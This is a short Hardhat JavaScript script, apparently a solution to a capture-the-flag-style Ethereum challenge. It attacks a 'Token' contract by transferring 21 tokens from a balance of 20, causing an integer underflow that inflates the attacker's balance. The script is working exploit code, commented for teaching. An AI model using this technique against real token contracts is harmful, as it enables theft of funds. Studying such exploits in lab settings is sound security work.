const hre = require("hardhat");
require("dotenv").config(); // to import public key

async function main() {
  const Victim = await ethers.getContractFactory("Token");
  const victim = await Victim.attach(
    "0xEA642E5Ee9F62A7253Fe17C93669a9A3f9489B48" // This is the contract address that you get from starting your instance
  );

  // We can check our balance initially
  const balance1 = await victim.balanceOf(process.env.PUBLIC_KEY);
  console.log("Your balance initially is ", balance1.toString());

  // Now we can call the transfer function forcing it to cause an underflow in our balance
  const attack = await victim.transfer(
    "0xea642e5ee9f62a7253fe17c93669a9a3f9489b48", // here you could pass any address
    21 // The 21 is so that there is an underflow 20 - 21 = -1
  );

  await attack.wait(1);

  // Verify that your balance has increased
  const balance2 = await victim.balanceOf(process.env.PUBLIC_KEY);
  console.log("Your new balance is ", balance2.toString());
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
